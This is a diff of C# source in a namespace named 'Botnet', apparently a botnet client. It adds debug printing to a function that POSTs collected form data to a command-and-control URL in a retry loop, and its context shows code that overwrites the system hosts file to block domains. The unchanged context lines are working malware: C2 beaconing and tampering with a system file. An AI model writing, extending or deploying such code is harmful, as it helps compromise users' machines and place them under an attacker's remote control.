@@ -1,4 +1,4 @@
-using Microsoft.Win32;
+﻿using Microsoft.Win32;
 using System;
 using System.Collections.Specialized;
 using System.Diagnostics;
@@ -126,12 +126,13 @@ namespace Botnet
 
         public static string ServerCommunication(NameValueCollection formData)
         {
-            // TODO: print form data
             Console.WriteLine("Sending communication to server...");
+            Console.WriteLine("//-------- Form Data -----------");
             foreach (string key in formData)
             {
                 Console.WriteLine("{0} {1}", key, formData[key]);
             }
+            Console.WriteLine("------------------------------//");
             byte[] responseBytes;
             while (true)
             {
@@ -142,7 +143,9 @@ namespace Botnet
                         webClient.Encoding = Encoding.UTF8;
                         responseBytes = webClient.UploadValues(C2_URL, "POST", formData);
                     }
-                    return Encoding.UTF8.GetString(responseBytes);
+                    string response = Encoding.UTF8.GetString(responseBytes);
+                    Console.WriteLine("Server response: " + response);
+                    return response;
                 }
                 catch (Exception e)
                 {
@@ -283,7 +286,7 @@ namespace Botnet
                     newHostsContent += "0.0.0.0\t" + line.Trim() + "\n";
                 }
             }
-            Console.WriteLine("newHostsContent: " + newHostsContent);
+            Console.WriteLine("newHostsContent:\n" + newHostsContent);
             try
             {
                 File.WriteAllText(systemHostsFile, newHostsContent.Trim());
